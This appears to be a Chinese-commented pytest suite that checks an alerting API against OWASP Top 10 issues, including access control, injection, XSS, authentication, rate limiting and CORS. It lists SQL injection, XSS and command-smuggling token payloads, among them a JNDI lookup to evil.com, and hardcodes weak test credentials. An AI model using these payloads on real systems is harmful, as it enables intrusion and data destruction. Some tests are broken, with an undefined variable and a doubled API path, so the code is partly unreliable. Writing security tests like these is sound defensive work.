"""
监控告警模块安全自动化测试
Sprint 28 - 安全测试用例实现 (OWASP Top 10)
"""

import pytest
import requests
import json
import time
from typing import Dict

# 测试配置
BASE_URL = "http://localhost:8080/api/v1"
ADMIN_USER = {"username": "admin", "password": "admin123"}
NORMAL_USER = {"username": "user", "password": "user123"}
READONLY_USER = {"username": "readonly", "password": "readonly123"}


class TestAccessControl:
    """权限控制测试 - OWASP A01"""
    
    def test_unauthorized_access_alert_rules(self):
        """TC-MA-S001: 未授权访问告警规则"""
        # 无Token访问
        resp = requests.get(f"{BASE_URL}/alerting/rules")
        assert resp.status_code == 401
        
        # 无效Token访问
        headers = {"Authorization": "Bearer invalid_token"}
        resp = requests.get(f"{BASE_URL}/alerting/rules", headers=headers)
        assert resp.status_code == 401
    
    def test_horizontal_privilege_escalation(self):
        """TC-MA-S002: 越权操作测试"""
        # 普通用户登录
        resp = requests.post(f"{BASE_URL}/auth/login", json=NORMAL_USER)
        if resp.status_code != 200:
            pytest.skip("测试用户不存在")
        
        token = resp.json().get("token")
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        
        # 尝试访问其他用户的规则（假设ID为1的规则属于其他用户）
        resp = requests.get(f"{BASE_URL}/alerting/rules/1", headers=headers)
        # 应该返回403或404
        assert resp.status_code in [403, 404]
        
        # 尝试修改其他用户的规则
        resp = requests.put(
            f"{BASE_URL}/alerting/rules/1",
            headers=headers,
            json={"threshold": 50}
        )
        assert resp.status_code in [403, 404]
    
    def test_rbac_permission_boundary(self):
        """TC-MA-S003: 角色权限验证"""
        # 只读用户登录
        resp = requests.post(f"{BASE_URL}/auth/login", json=READONLY_USER)
        if resp.status_code != 200:
            pytest.skip("只读用户不存在")
        
        token = resp.json().get("token")
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        
        # 只读用户应该能查看
        resp = requests.get(f"{BASE_URL}/alerting/rules", headers=headers)
        assert resp.status_code == 200
        
        # 只读用户不应该能创建
        rule = {"name": "test", "metric": "cpu", "threshold": 50}
        resp = requests.post(f"{BASE_URL}/alerting/rules", headers=headers, json=rule)
        assert resp.status_code == 403
        
        # 只读用户不应该能修改
        resp = requests.put(f"{BASE_URL}/alerting/rules/1", headers=headers, json={"threshold": 60})
        assert resp.status_code == 403
        
        # 只读用户不应该能删除
        resp = requests.delete(f"{BASE_URL}/alerting/rules/1", headers=auth_headers)
        assert resp.status_code == 403


class TestInjectionAttacks:
    """注入攻击测试 - OWASP A03"""
    
    @pytest.fixture
    def auth_headers(self):
        resp = requests.post(f"{BASE_URL}/auth/login", json=ADMIN_USER)
        token = resp.json().get("token")
        return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    def test_sql_injection_in_rule_name(self, auth_headers):
        """TC-MA-S004: SQL注入测试"""
        sql_payloads = [
            "test' OR '1'='1",
            "test'; DROP TABLE alerting_rules; --",
            "test' UNION SELECT * FROM users --",
            "test' AND 1=1 --",
            "test\"; SELECT * FROM alerting_rules; --",
            "test` WHERE 1=1 --",
        ]
        
        for payload in sql_payloads:
            rule = {
                "name": payload,
                "metric": "cpu_usage",
                "threshold": 80,
                "condition": "gt",
                "duration": 60,
                "severity": "warning"
            }
            
            resp = requests.post(f"{BASE_URL}/alerting/rules", headers=auth_headers, json=rule)
            
            # 如果创建成功，验证数据被正确转义
            if resp.status_code == 201:
                rule_id = resp.json().get("id")
                get_resp = requests.get(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)
                if get_resp.status_code == 200:
                    data = get_resp.json()
                    # 验证名称被正确存储（没有被解释为SQL）
                    assert data["name"] == payload or "'" not in data["name"]
                
                # 清理
                requests.delete(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)
            
            # 不应该出现500错误（SQL语法错误）
            assert resp.status_code != 500, f"SQL注入payload导致服务器错误: {payload}"
    
    def test_sql_injection_in_description(self, auth_headers):
        """TC-MA-S004: SQL注入测试 - 描述字段"""
        sql_payloads = [
            "'; DELETE FROM alerting_rules WHERE 1=1; --",
            "' OR 1=1 --",
            "'; UPDATE alerting_rules SET enabled=1; --",
        ]
        
        for payload in sql_payloads:
            rule = {
                "name": f"sql_test_{int(time.time())}",
                "description": payload,
                "metric": "cpu_usage",
                "threshold": 80,
                "condition": "gt",
                "duration": 60,
                "severity": "warning"
            }
            
            resp = requests.post(f"{BASE_URL}/alerting/rules", headers=auth_headers, json=rule)
            assert resp.status_code != 500, f"SQL注入导致服务器错误"
            
            if resp.status_code == 201:
                rule_id = resp.json().get("id")
                requests.delete(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)
    
    def test_nosql_injection_in_metric_name(self, auth_headers):
        """NoSQL注入测试"""
        nosql_payloads = [
            {"metric": {"$ne": None}},
            {"metric": {"$gt": ""}},
            {"$where": "this.threshold > 50"},
        ]
        
        for payload in nosql_payloads:
            rule = {
                "name": f"nosql_test_{int(time.time())}",
                "metric": str(payload),
                "threshold": 80,
                "condition": "gt",
                "duration": 60,
                "severity": "warning"
            }
            
            resp = requests.post(f"{BASE_URL}/alerting/rules", headers=auth_headers, json=rule)
            # 不应该因为NoSQL注入而出错
            assert resp.status_code in [201, 400], f"NoSQL注入导致异常: {resp.status_code}"
            
            if resp.status_code == 201:
                rule_id = resp.json().get("id")
                requests.delete(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)


class TestXSSAttacks:
    """XSS攻击测试 - OWASP A07"""
    
    @pytest.fixture
    def auth_headers(self):
        resp = requests.post(f"{BASE_URL}/auth/login", json=ADMIN_USER)
        token = resp.json().get("token")
        return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    def test_xss_in_rule_name(self, auth_headers):
        """TC-MA-S005: XSS攻击测试 - 规则名称"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<body onload='alert(1)'>",
            "<iframe src='javascript:alert(1)'>",
            "<a href='javascript:alert(1)'>click</a>",
            "<svg onload='alert(1)'>",
            "<input onfocus='alert(1)' autofocus>",
        ]
        
        for payload in xss_payloads:
            rule = {
                "name": payload,
                "metric": "cpu_usage",
                "threshold": 80,
                "condition": "gt",
                "duration": 60,
                "severity": "warning"
            }
            
            resp = requests.post(f"{BASE_URL}/alerting/rules", headers=auth_headers, json=rule)
            
            if resp.status_code == 201:
                rule_id = resp.json().get("id")
                
                # 获取规则并验证XSS被转义
                get_resp = requests.get(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)
                if get_resp.status_code == 200:
                    data = get_resp.json()
                    name = data.get("name", "")
                    # 验证脚本标签被转义
                    assert "<script>" not in name or "&lt;script&gt;" in name, f"XSS未转义: {payload}"
                
                # 清理
                requests.delete(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)
    
    def test_xss_in_description(self, auth_headers):
        """TC-MA-S005: XSS攻击测试 - 描述字段"""
        xss_payloads = [
            "规则描述<script>alert('XSS')</script>",
            "描述<img src='x' onerror='alert(1)'>",
        ]
        
        for payload in xss_payloads:
            rule = {
                "name": f"xss_test_{int(time.time())}",
                "description": payload,
                "metric": "cpu_usage",
                "threshold": 80,
                "condition": "gt",
                "duration": 60,
                "severity": "warning"
            }
            
            resp = requests.post(f"{BASE_URL}/alerting/rules", headers=auth_headers, json=rule)
            
            if resp.status_code == 201:
                rule_id = resp.json().get("id")
                
                get_resp = requests.get(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)
                if get_resp.status_code == 200:
                    data = get_resp.json()
                    desc = data.get("description", "")
                    assert "<script>" not in desc or "&lt;script&gt;" in desc
                
                requests.delete(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)
    
    def test_xss_in_notification_content(self, auth_headers):
        """XSS攻击测试 - 通知内容"""
        xss_payload = "告警: <script>alert('XSS')</script>"
        
        rule = {
            "name": f"xss_notification_{int(time.time())}",
            "metric": "cpu_usage",
            "threshold": 80,
            "condition": "gt",
            "duration": 60,
            "severity": "warning",
            "notification_template": xss_payload
        }
        
        resp = requests.post(f"{BASE_URL}/alerting/rules", headers=auth_headers, json=rule)
        
        if resp.status_code == 201:
            rule_id = resp.json().get("id")
            
            # 验证通知内容被转义
            get_resp = requests.get(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)
            if get_resp.status_code == 200:
                data = get_resp.json()
                template = data.get("notification_template", "")
                assert "<script>" not in template or "&lt;script&gt;" in template
            
            requests.delete(f"{BASE_URL}/alerting/rules/{rule_id}", headers=auth_headers)


class TestAPIAuthentication:
    """API认证测试 - OWASP A02"""
    
    def test_missing_authentication(self):
        """TC-MA-S006: API认证测试 - 缺少Token"""
        endpoints = [
            ("GET", "/alerting/rules"),
            ("POST", "/alerting/rules"),
            ("GET", "/alerting/alerts"),
            ("GET", "/metrics/query"),
            ("POST", "/metrics/push"),
        ]
        
        for method, endpoint in endpoints:
            if method == "GET":
                resp = requests.get(f"{BASE_URL}{endpoint}")
            elif method == "POST":
                resp = requests.post(f"{BASE_URL}{endpoint}", json={})
            
            assert resp.status_code == 401, f"{method} {endpoint} 应返回401"
    
    def test_invalid_token(self):
        """TC-MA-S006: API认证测试 - 无效Token"""
        headers = {"Authorization": "Bearer invalid_token_12345"}
        
        resp = requests.get(f"{BASE_URL}/alerting/rules", headers=headers)
        assert resp.status_code == 401
        
        resp = requests.post(f"{BASE_URL}/alerting/rules", headers=headers, json={"test": "data"})
        assert resp.status_code == 401
    
    def test_expired_token(self):
        """TC-MA-S006: API认证测试 - 过期Token"""
        # 使用一个明显过期的Token格式
        expired_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1MDAwMDAwMDB9.test"
        headers = {"Authorization": f"Bearer {expired_token}"}
        
        resp = requests.get(f"{BASE_URL}/alerting/rules", headers=headers)
        assert resp.status_code in [401, 403]
    
    def test_token_injection_attempts(self):
        """Token注入攻击测试"""
        malicious_tokens = [
            "Bearer ../../etc/passwd",
            "Bearer $(whoami)",
            "Bearer `cat /etc/passwd`",
            "Bearer ${jndi:ldap://evil.com}",
        ]
        
        for token in malicious_tokens:
            headers = {"Authorization": token}
            resp = requests.get(f"{BASE_URL}/alerting/rules", headers=headers)
            # 不应导致服务器错误
            assert resp.status_code in [401, 400], f"恶意Token导致异常: {token[:30]}"


class TestRateLimiting:
    """频率限制测试 - OWASP A05"""
    
    @pytest.fixture
    def auth_headers(self):
        resp = requests.post(f"{BASE_URL}/auth/login", json=ADMIN_USER)
        token = resp.json().get("token")
        return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    def test_api_rate_limiting(self, auth_headers):
        """TC-MA-S007: 频率限制测试"""
        # 快速发送100次请求
        responses = []
        for i in range(100):
            resp = requests.get(
                f"{BASE_URL}/alerting/rules",
                headers=auth_headers
            )
            responses.append(resp.status_code)
        
        # 统计429响应
        rate_limited = responses.count(429)
        
        print(f"\n总请求: {len(responses)}")
        print(f"200响应: {responses.count(200)}")
        print(f"429响应: {rate_limited}")
        
        # 应该触发限流
        assert rate_limited > 0, "未触发频率限制"
    
    def test_rate_limit_headers(self, auth_headers):
        """频率限制响应头测试"""
        # 触发限流
        for i in range(100):
            resp = requests.get(
                f"{BASE_URL}/alerting/rules",
                headers=auth_headers
            )
            if resp.status_code == 429:
                # 验证限流头
                assert "Retry-After" in resp.headers or "X-RateLimit-Reset" in resp.headers
                break
    
    def test_rate_limit_recovery(self, auth_headers):
        """频率限制恢复测试"""
        # 触发限流
        rate_limited = False
        for i in range(100):
            resp = requests.get(f"{BASE_URL}/alerting/rules", headers=auth_headers)
            if resp.status_code == 429:
                rate_limited = True
                break
        
        if rate_limited:
            # 等待一段时间后恢复
            time.sleep(5)
            
            resp = requests.get(f"{BASE_URL}/alerting/rules", headers=auth_headers)
            # 应该恢复正常
            assert resp.status_code == 200, "限流后未恢复"


class TestCSRFProtection:
    """CSRF防护测试"""
    
    @pytest.fixture
    def auth_headers(self):
        resp = requests.post(f"{BASE_URL}/auth/login", json=ADMIN_USER)
        token = resp.json().get("token")
        return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    def test_csrf_token_validation(self, auth_headers):
        """TC-MA-S008: CSRF防护测试"""
        # 不带CSRF Token的请求
        headers = auth_headers.copy()
        if "X-CSRF-Token" in headers:
            del headers["X-CSRF-Token"]
        
        rule = {
            "name": f"csrf_test_{int(time.time())}",
            "metric": "cpu_usage",
            "threshold": 80,
            "condition": "gt",
            "duration": 60,
            "severity": "warning"
        }
        
        resp = requests.post(f"{BASE_URL}/alerting/rules", headers=headers, json=rule)
        
        # 如果启用CSRF保护，应返回403
        # 如果未启用，应返回201
        assert resp.status_code in [201, 403]
    
    def test_cross_origin_requests(self, auth_headers):
        """跨域请求测试"""
        headers = auth_headers.copy()
        headers["Origin"] = "https://evil-site.com"
        
        resp = requests.get(f"{BASE_URL}/alerting/rules", headers=headers)
        
        # 检查CORS头
        if "Access-Control-Allow-Origin" in resp.headers:
            allowed_origin = resp.headers["Access-Control-Allow-Origin"]
            # 不应允许任意源
            assert allowed_origin != "*", "CORS配置允许任意源"
            assert "evil-site.com" not in allowed_origin, "CORS允许恶意源"


class TestSecurityMisconfiguration:
    """安全配置错误测试 - OWASP A05"""
    
    def test_security_headers(self):
        """安全响应头测试"""
        resp = requests.get(f"{BASE_URL}/health")
        
        # 检查安全头
        headers = resp.headers
        
        # X-Content-Type-Options
        assert headers.get("X-Content-Type-Options") == "nosniff", "缺少X-Content-Type-Options头"
        
        # X-Frame-Options
        assert headers.get("X-Frame-Options") in ["DENY", "SAMEORIGIN"], "缺少X-Frame-Options头"
        
        # 不应暴露敏感信息
        assert "X-Powered-By" not in headers, "暴露X-Powered-By头"
        assert "Server" not in headers or headers["Server"] == "", "暴露Server版本信息"
    
    def test_error_information_disclosure(self):
        """错误信息泄露测试"""
        # 触发错误
        resp = requests.get(f"{BASE_URL}/alerting/rules/invalid-id-format")
        
        if resp.status_code >= 400:
            body = resp.text.lower()
            # 不应包含敏感信息
            assert "stack trace" not in body, "泄露堆栈跟踪"
            assert "exception" not in body, "泄露异常信息"
            assert "sql" not in body, "泄露SQL信息"
            assert "password" not in body, "泄露密码信息"
    
    def test_http_methods(self):
        """HTTP方法测试"""
        # 测试不支持的方法
        resp = requests.patch(f"{BASE_URL}/alerting/rules")
        assert resp.status_code in [405, 404], "应返回405 Method Not Allowed"
        
        resp = requests.trace(f"{BASE_URL}/alerting/rules")
        assert resp.status_code in [405, 404], "TRACE方法应被禁用"


class TestVulnerableComponents:
    """脆弱组件测试 - OWASP A06"""
    
    def test_dependency_vulnerabilities(self):
        """依赖漏洞扫描"""
        # 获取依赖信息
        resp = requests.get(f"{BASE_URL}/system/dependencies")
        
        if resp.status_code == 200:
            deps = resp.json().get("dependencies", [])
            
            # 检查已知漏洞依赖
            vulnerable_patterns = [
                "log4j", "log4shell",
                "spring", "cve-",
                "openssl",
            ]
            
            for dep in deps:
                dep_str = json.dumps(dep).lower()
                for pattern in vulnerable_patterns:
                    if pattern in dep_str:
                        # 记录但不失败，需要人工确认
                        print(f"警告: 发现潜在脆弱依赖: {dep}")
    
    def test_api_versioning(self):
        """API版本测试"""
        # 旧版本API应仍可用或返回适当错误
        resp = requests.get(f"{BASE_URL}/v0/alerting/rules")
        assert resp.status_code in [200, 404, 410], "旧版本API响应异常"
        
        # 当前版本
        resp = requests.get(f"{BASE_URL}/api/v1/alerting/rules")
        assert resp.status_code in [200, 401], "当前版本API响应异常"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
